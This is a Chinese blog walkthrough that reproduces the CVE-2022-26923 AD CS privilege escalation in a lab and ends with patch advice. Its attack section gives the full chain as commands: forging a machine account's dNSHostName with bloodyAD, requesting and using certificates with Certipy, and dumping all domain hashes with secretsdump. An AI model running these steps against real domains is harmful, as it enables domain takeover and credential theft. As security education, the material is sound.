# CVE-2022-26923 Windows 域提权漏洞 - Vice_2203 - 博客园

> 原文：[`www.cnblogs.com/BlogVice-2203/p/17009069.html`](https://www.cnblogs.com/BlogVice-2203/p/17009069.html)

## **前言**

Active Directory 域服务，是一种目录服务，提供了存储目录数据信息以及用户相关的一些密码，电话号码等等一些数据信息，且可让用户和管理员使用这些数据，有利于域管理员对用户的数据信息进行管理。
AD CS (Active Directory Certipy Server)是允许你构建公钥基础机构 (PKI) 并为你的组织提供公钥加密、数字证书和数字签名功能的服务器角色。

### **漏洞影响范围**

```
Windows 8.1
Windows 10 Version 1607, 1809,1909, 2004, 20H2, 21H1, 21H2
Windows 11
Windows Server 2008，2012，2016，2019，2022 
```

### **环境搭建**

```
kali ip:192.168.33.131
windows server 2012 ip: 192.168.33.144 
```

> windows server 2012 网络配置，这里想改计算机全名但是忘记了，如果要好记得名字，可以安装域前先改掉

![](img/5ce13885bd874c4a1edad658bc7a9e93.png)

![](img/d91bbae44486661212ffb48a63c6b548.png)

> 这里用到了 windows server 2012 的环境，首先搭建 windows server 2012 的 AD 域服务和域服务证书，这里安装步骤除了勾选的地方其他默认下一步

![](img/d7ef42f06b36fc9d13fb263b2c0464a6.png)

> 点击提升域控制，添加新林，然后下一步还原密码后安装重启

![](img/871fa5d44c45316c23dd2ba0bb158d69.png)

![](img/8eb5d24b9e6a78cc83a8568e41a627cd.png)

![](img/5cc6bbf1bced0ccc3cb80031c40b9d0d.png)

> ADCS 证书安装，添加功能，勾选 AD 证书服务，添加 web 证书颁发，开始安装

![](img/4c32f0a231052655bdb87a39ef1247fc.png)

![](img/9b56d71374774af5be1992afc42d140e.png)

![](img/a4f07081d016ae1318ed40dcb6292c51.png)

> 配置证书服务，在角色服务勾选证书机构和证书 web 注册，其他可以一直下一步，这里为了其他配置不一样的读者，就都放出来了，都一样的可以选择跳过
> ![](img/05419a6e853fe04373a621807efb05cf.png)

![](img/903a094b94aa2a690af5295ced93aef4.png)

![](img/eaa970592525420f06fdfb3c61e4ca68.png)

![](img/34de762dd93668d792b376011a094ac7.png)

![](img/99809a57818c0562a36a6964a36f8573.png)

![](img/a8cded377570e60a8ebc1200e245c0cc.png)

![](img/9091f6b5361b779cc95e8fef98522dd8.png)

![](img/b8a45ce9ca74ccc8eff9f024317f19cb.png)

![](img/7e27af2a727d638f30b44873ea2b7d5e.png)

![](img/c75ed9c4e62cbb68dbcc663c4941edbe.png)

![](img/0137ff681d575ff6618335f6e2d47c19.png)

> 配置成功结果图

![](img/61a0262d5b28fea46eab6737d26a6c4f.png)

> 创建低权限 AD 用户，点击 AD 用户和计算机，点击本地域 ，查找 User，双击进入，找到 Administrator 用户 ，点击左侧新建，新建用户

![](img/c66efc05f177eaeed4b9e77c768720f1.png)

![](img/b350a0ac8c2f618568c8796e5a3e41d0.png)

![](img/ea75f7fde09ccc3472a7775aba512e78.png)

![](img/6f90ad70bf98d88314bde4746fb8bea8.png)

> 新建用户 test，填写全名，输入密码，勾选其他密码选项，选择密码永不过期和不能更改密码

![](img/198eda993078d520bb8a95fe390350a8.png)

> 配置 window7 网络配置以及加入域，这里加入域 xming.com，用户是在域控新建的 test，密码是自己在域设置的密码(注：我这里只用到 kali 和 window server 2012 就没多加 win7，方便演示，想用 win7 的老铁可以参考以下 win7 配置)

![](img/e0a4eea750102d0d333e2c9fef70cc4c.png)

![](img/83053e568a1db1ad7ee9a0de2d319254.png)

> kali 配置
> 在 kali 需要两个工具 Certipy 和 bloody

```
certipy 配置
https://github.com/ly4k/Certipy  //工具所在网址
git clone https://github.com/ly4k/Certipy.git
cd Certipy
proxychains4 python3 setup.py install //配置代理安装(这里我用的是 proxychains4 的，也可以用 proxychains，如果有的话)

这里我是直接去 github 下载再复制到 kali，就跳过第二条命令

由于我这里因为 pip 没装，所以我又装了 pip
pip 安装的步骤参考此链接：https://www.cnblogs.com/BlogVice-2203/p/17011741.html 
```

![](img/b50cd2cf584e9f91c0f9ab7591c052f8.png)

> 这里我遇到的报错是要 pyopenssl>=22.0.0,所以我直接用 pip install pyopenssl==22.0.0

![](img/ea6f12f3f4a2562843a66742794bde8e.png)

> 然后再次安装有出现报错，说没有 dsinternals，又得 pip install dsinternals

![](img/d57b0325392b40b0139ca2c382ac2cb8.png)

> 如果没有遇到以下报错，就直接执行成功

![](img/9974eb7e2b73def67b7bb03d9ffe88df.png)

```
配置 bloodyAD
https://github.com/CravateRouge/bloodyAD
git clone https://github.com/CravateRouge/bloodyAD.git
cd bloodyAD
proxychains4 pip3 install -r requirements.txt 
```

![](img/f525953ca3a6bc46e787c3b39f675d8d.png)

![](img/d1d7d1ddc8fbb1f1a4f93279283500ee.png)

> 这里报错了，需要下载一个 libkrb5-dev 包
> `apt-get install libkrb5-dev`

![](img/8844ad9f7b1368c4d0ab98d6177deb37.png)

![](img/a10111b8532744a49ed5abc4b7cacbcb.png)

![](img/0e613f59600915a4cfe762c3897ce66e.png)

```
总结一下上面 bloodyAD 安装
先执行 apt-get install libkrb5-dev
再执行 proxychains4 pip3 install -r requirements.txt 看看是否有报错
如果有就使用 pip install 需要的安装包(如果有需要必要的版本可以 pip install 安装包==需要的版本号) 如上图所示
最后再执行 proxychains4 pip3 install -r requirements.txt 会发现没有报错就是执行成功。 
```

![](img/4f6fa9e046f6408c07c27e42badbd6fa.png)

> 执行 python3 bloodyAD.py -h，发现安装成功，到此环境就搭建完成了

![](img/5e38e60951ab6ce42ef766d474c94e4c.png)

### **漏洞复现**

```
执行以下代码之前需要运行
pip3 install certipy-ad

这是我的申请 CA 证书的 poc
certipy req -username test@xming.com -password zgm#1573 -ca xming-WIN-UE0S6A9DB79-CA -target WIN-UE0S6A9DB79.xming.com -template User

然后再执行
certipy auth -pfx test.pfx -dc-ip 192.168.33.144 
```

![](img/ff4fb504bafdf65d004bda953cb22271.png)

![](img/b22ea99aa859ec69fac67bf7076511c1.png)

![](img/58f8fb4da89117565dba88c3e7ffd95c.png)

> 创建及其账户到域

```
使用 bloodyAD 查看 ms-DS-MachineAccountQuota 属性，如果 ms-DS-MachineAccountQuota>0 就可以创建机器帐户
python3 bloodyAD.py -d xming.com -u test -p zgm#1573 --host 192.168.33.144  getObjectAttributes "DC=xming,DC=com"  ms-DS-MachineAccountQuota
这里一开始是报错 需要在/usr/local/lib/python3.10/dist-packages/ldap3/utils/ntlm.py 修改 from Crypto.Hash import MD4 为 from Cryptodome.Hash import MD4 
没报错且运行出来的老铁可以不改

使用 bloodyAD 查看 ms-DS-MachineAccountQuota 属性，如果 ms-DS-MachineAccountQuota>0 就可以创建机器帐户 
```

![](img/755bb13c620f5384abbd57613d9d89e3.png)

![](img/989dad07f19cb7d984a6a839309e3538.png)

![](img/cb4e95e23542877a010bb97c55d5d7fd.png)

> 在 LDAP 中创建一个机器帐户，然后查看 Active Directory 用户和计算机 点击 computers 查看到 test66 是我们创建出来的机器账户

```
python3 bloodyAD.py -d 'xming.com' -u 'test' -p 'zgm#1573' --host '192.168.33.144' addComputer test66 'jntm'
创建一个 test66 密码为 jntm 的机器账户 
```

![](img/a17fb0c12b108f79559961cb916748bd.png)

![](img/159bf295f71b0691450c111cd30faa69.png)

> 我们更新一下机器帐户的 DNSHostName，但是这里出现了一个错误，我排除了一下是我们没有给 DNS 读取和写入的权限，勾选上两个权限，排除后重新执行就成功了

```
python3 bloodyAD.py -d 'xming.com' -u 'test' -p 'zgm#1573' --host '192.168.33.144' setAttribute 'CN=test66,CN=Computers,DC=xming,DC=com' DNSHOSTName '["WIN-UE0S6A9DB79.xming.com"]'

python3 bloodyAD.py -d 'xming.com' -u 'test' -p 'zgm#1573' --host '192.168.33.144' getObjectAttributes 'CN=test66,CN=Computers,DC=xming,DC=com' DNSHOSTName 
```

![](img/bf8f60283019e1db7d161c8be98ab567.png)

![](img/18f890814c37fdfd2030972e70499ccc.png)

![](img/1c68b2ab4f41a82888a6689a1a3661c5.png)

![](img/8ce13cb4b22e0943d0e7a57da3248c05.png)

![](img/62cbf0fee5a2d581a66c2df750034a02.png)

> 我们这里就使用伪造的计算机账户进行证书申请，因为在计算机账户中，CA 是使用 DNSname 的值来验证，如果这个值是域控的 DNSname,CA 就会认为是域控，这里为什么说只用计算机账户而不用用户账户(test)，是因为用户账户的具有一个用户主体名称 UPN(User Principal Name)，UPN 是具有唯一性不可变的，而计算机账户没有

> 根据 MS-ADTS（3.1.1.5.1.3） 唯一性约束，UPN 必须是唯一的，不能有两个具有相同 UPN 的用户

![](img/8fc9efd6e9bd103bf95f3d09bcdb5c92.png)

![](img/5eba6bb2aebce99f186bea47eec632f4.png)

```
这里使用的是计算机账户模板(Machine)，不再是 User
certipy req -username test66\$@xming.com -password jntm -ca xming-WIN-UE0S6A9DB79-CA -target xming.com -template Machine -debug

生成一个 win-ue0s6a9db79.pfx
这里调了一个 bug 我把 kali 的网关改为了 192.168.33.144 否则总是报错

certipy auth -pfx win-ue0s6a9db79.pfx -dc-ip 192.168.33.144

这里如果报错 KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)，直接去重新启动一下你的 AD CS 而不是重启虚拟机(可以重启但可能登陆不进去) 
```

![](img/4ed55560e3bb687ca5e73a8be71bad0f.png)

![](img/290a1577e9c2b03b30b0385e53212bc5.png)

![](img/0d1ea90109ae68142867c88e1d5200cf.png)

> 获取所有域中的所有 hash

```
impacket-secretsdump 'xming.com/win-ue0s6a9db79$@xming.com' -hashes :3fa24d31749f89de0db2449ab8014c79 
```

![](img/60cfe75e78bf742a318024c2bc79eb68.png)

> PTH 获取域控

```
![](https://img2023.cnblogs.com/blog/2913000/202301/2913000-20230101141133348-72226788.png) 
```

![](img/913cabdb46bd1469e43240f41eb64690.png)

![](img/5029d5d7b5c6feadb863279fec6ef0c6.png)

### **总结与修复建议**

> 总结：该漏洞是由于安装了域证书服务(AD CS)，攻击者可以使用计算机账户模板(Machine)创建机器账户，更新 dnsname 为域控的 dnsname，获取所有域 hash，进一步拿到域控管理员权限
> 修复建议:安装微软给出的补丁 [`msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923`](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923)
> 其中说到域证书服务和域服务可以不用安装到一台服务器，以规避风险